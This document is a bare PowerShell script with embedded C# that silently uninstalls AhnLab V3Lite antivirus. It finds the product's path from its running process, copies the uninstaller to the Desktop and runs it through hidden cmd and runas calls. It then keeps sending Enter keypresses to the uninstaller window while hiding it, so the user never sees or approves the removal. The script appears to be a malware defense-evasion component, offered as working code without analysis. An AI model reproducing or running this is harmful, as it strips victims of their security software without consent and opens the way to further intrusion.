Add-Type '
using System;
using System.Runtime.InteropServices;

public class WindowHelper {
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool PostMessage( IntPtr hWnd,
                                    uint Msg,
                                    IntPtr wParam,
                                    IntPtr lParam);
    [return : MarshalAs(UnmanagedType.Bool)]

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);

    const Int32 WM_KEYDOWN = 0x0100;
    const Int32 VK_RETURN = 0x0D;
    public static void SendKeysMe(int hWnd) {
        PostMessage(new IntPtr(hWnd),
                    WM_KEYDOWN,
                    new IntPtr(VK_RETURN),
                    new IntPtr(0));
        ShowWindow(new IntPtr(hWnd),
                    0);
    }
}
';

$a1=(Get-Process -Name V3Lite).path | Split-Path;

$a2 = $a1+'\Uninst.exe';

if([System.IO.File]::Exists($a2)){
  $a5 = $ENV:UserProfile+'\Desktop\install.exe';
  $a6 = "C:\Windows\System32\cmd.exe";
  Copy-Item $a2 -Destination $a5;
  $a3 = '/c "runas /trustlevel:0x40000 ^"'+$a5+' -Uninstall^" & ^"%TEMP%\AhnUn000.tmp^" -UC"';
  start-process $a6 $a3 -WindowStyle Hidden;
  $a7 = '/c "runas /trustlevel:0x40000 ^"%TEMP%\AhnUn000.tmp -UC^""';
  Start-Sleep -seconds 5;
  start-process $a6 $a7 -WindowStyle Hidden;
  $a = 0;
  While ($a -le 5) {
    Start-Sleep -s 1;
    $a4 = Get-Process "AhnUn000.tmp";
    if ($a4) {
      if([int]$a4.MainWindowHandle -eq 0) {
        Start-Sleep -seconds 1
      }
      [WindowHelper]::SendKeysMe($a4.MainWindowHandle)
    }
  }
}
